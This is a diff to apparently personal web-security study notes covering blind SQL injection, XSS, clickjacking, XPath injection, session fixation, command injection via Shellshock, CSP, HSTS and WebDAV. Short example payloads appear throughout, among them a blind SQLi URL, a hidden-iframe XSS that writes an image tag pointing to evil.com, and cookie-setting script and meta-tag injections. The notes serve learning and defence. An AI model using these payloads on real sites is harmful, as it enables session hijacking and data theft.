@@ -147,6 +147,11 @@ Mitigation:
 			Developers are usually only required to build SQL statements with parameters that are 
 			automatically parameterized. 
 		4. WAF
+		
+Blind SQL Injection: This attack is often used when the web application is configured to show generic error messages, 				but has not mitigated the code that is vulnerable to SQL injection. Blind SQL (Structured Query 			Language) injection is a type of SQL Injection attack that asks the database true or false 				questions and determines the answer based on the applications response. 
+
+For ex: http://newspaper.com/items.php?id=2 and 1=1
+     If the content of the page that returns 'true' is different than that of the page that returns 'false', then the attacker is able to distinguish when the executed query returns true or false. 
 				
 https://www.youtube.com/watch?v=sJdWuPHKRRY
 
@@ -409,7 +414,8 @@ Both RAM and SITA have a common symmetric number now.
 
 		2. A website example.com has a XSS vulnerable parameter q.
 
-		3. The user is tricked to visit evil.com that contains an iframe, which makes request to the flawed example.com
+		3. The user is tricked to visit evil.com that contains an iframe, which makes request to 
+		the flawed example.com
 
 	<iframe style="position:absolute;top:-9999px" src="http://example.com/↵
     flawed-page.html?q=<script>document.write('<img src=\"http://evil.com/↵
@@ -428,7 +434,8 @@ Here the user doesn't knows that example.com was visited.
 20. Clickjacking is an attack that occurs when an attacker uses a transparent iframe in a window to trick a user into
   clicking on a button or link, to another server in which they have an identical looking window.
 
-	Example: For example, imagine an attacker who builds a web site that has a button on it that says "click here for
+	Example: For example, imagine an attacker who builds a web site that has a button on it that says
+	"click here for
 	a free iPod". However, on top of that web page, the attacker has loaded an iframe with your mail account, and
 	lined up exactly the "delete all messages" button directly on top of the "free iPod" button. The victim tries
 	to click on the "free iPod" button but instead actually clicked on the "delete all messages" button. In essence,
@@ -436,20 +443,20 @@ Here the user doesn't knows that example.com was visited.
 
 21. XPATH injection
 
-		1. Xpath is a language used to query certain parts of a XML document. It can be compared to the SQL language
-		used to query databases.
+		1. Xpath is a language used to query certain parts of a XML document. It can be compared to
+		the SQL language used to query databases.
 
-		2. XPath Injection attacks occur when a web site uses user-supplied information to construct an XPath query
-		for XML data.
+		2. XPath Injection attacks occur when a web site uses user-supplied information to construct
+		an XPath query for XML data.
 
 		3. By sending intentionally malformed information into the web site, an attacker can find out how the
 		XML data is structured, or access data that he may not normally have access to.
 
 		Mitigation:
-			 >Use a parameterized XPath interface if one is available, or escape the user input to make
+			 > Use a parameterized XPath interface if one is available, or escape the user input to make
 			 it safe to include in a dynamically constructed query.
 
-			 >input containing any XPath metacharacters such as " ' / @ = * [ ] ( and ) should be rejected.
+			 > Input containing any XPath metacharacters such as " ' / @ = * [ ] ( and ) should be rejected.
 
 22. Session Fixation attack is an attack technique that forces a user's session ID to an explicit value that permits an attacker to hijack a valid user session
 
@@ -465,11 +472,13 @@ The example below explains a simple form, the process of the attack, and the exp
 		> Meta tag attack : Using this we can set a cookie value on the server.
 			http://website.kon/<meta http-equiv=Set-Cookie content=”sessionid=abcd”>
 
-		> A Cross-site Scripting vulnerability present on any web site in the domain can be used to modify the current cookie value.
+		> A Cross-site Scripting vulnerability present on any web site in the domain can be used 
+		        to modify the current cookie value.
 			http://example/<script>document.cookie="sessionid=1234;%20domain=.example.dom";</script>
 
 		> HTTP header response
-			The insertion of the value of the SessionID into the cookie manipulating the server response can be made, intercepting 				the packages exchanged between the client and the Web Application inserting the Set-Cookie parameter.
+			The insertion of the value of the SessionID into the cookie manipulating the server response 				can be made, intercepting the packages exchanged between the client and the
+			Web Application inserting the Set-Cookie parameter.
 
 https://www.owasp.org/index.php/Session_fixation
 
@@ -527,3 +536,47 @@ When a developer fails to apply authorization checks while various objects are b
 Ex- Image with the name hello.gif and can be changed to hello.phpA.gif. Try replacing the hex value of A (\x60) with null byte which is (\x00)
 
 28. Port Knocking : In computer networking, port knocking is a method of externally opening ports on a firewall by generating a connection attempt on a set of prespecified closed ports.
+
+28. Command Injection
+
+Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell.
+
+Ex- ShellShock Vulnerability
+
+Shellshock is a security bug causing Bash to execute commands from environment variables unintentionally.
+
+Since the environment variables are not sanitized properly by Bash before being executed, the attacker can send commands to the server through HTTP requests and get them executed by the web server operating system. 
+
+An attacker can potentially use CGI to send a malformed environment variable to a vulnerable Web server. Because the server uses Bash to interpret the variable, it will also run any malicious command tacked-on to it.
+
+29. Content Security Policy (CSP) 
+is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. 
+
+Ex-1
+A web site administrator wants all content to come from the site's own origin (this excludes subdomains.)
+
+Content-Security-Policy: default-src 'self'
+
+Ex-2 
+A web site administrator wants to allow content from a trusted domain and all its subdomains (it doesn't have to be the same domain that the CSP is set on.)
+
+Content-Security-Policy: default-src 'self' *.trusted.com
+
+30. HSTS
+
+a. HTTP Strict Transport Security (HSTS) is an opt-in security enhancement that is specified by a web application through the use of a special response header. Once a supported browser receives this header that browser will prevent any communications from being sent over HTTP to the specified domain and will instead send all communications over HTTPS.
+
+b. HSTS does not allow a user to override the invalid certificate message
+
+31. WebDav
+
+a. Web Distributed Authoring and Versioning (WebDAV) is an extension of the Hypertext Transfer Protocol (HTTP) that allows clients to perform remote Web content authoring operations.
+
+b. The WebDAV protocol provides a framework for users to create, change and move documents on a server.
+
+COPY
+    copy a resource from one URI to another
+MOVE
+    move a resource from one URI to another
+
+
